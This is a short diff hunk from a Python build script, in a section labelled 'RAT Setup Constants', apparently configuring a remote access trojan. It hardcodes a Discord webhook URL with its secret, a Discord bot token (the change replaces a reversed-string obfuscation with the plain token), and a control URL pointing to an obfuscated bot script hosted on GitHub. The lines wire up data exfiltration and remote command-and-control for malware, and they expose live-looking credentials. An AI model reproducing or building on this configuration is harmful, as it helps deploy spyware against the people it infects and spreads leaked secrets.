@@ -161,7 +161,7 @@ build_executable(spec_path)
 
 # RAT Setup Constants
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
-TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
+TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg.G2np2a.9iHwQemot92LI5lM2HYJJc05wFyyZY4cLexLW8"
 BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
 UNIQUE_ID = str(uuid.uuid4())
 
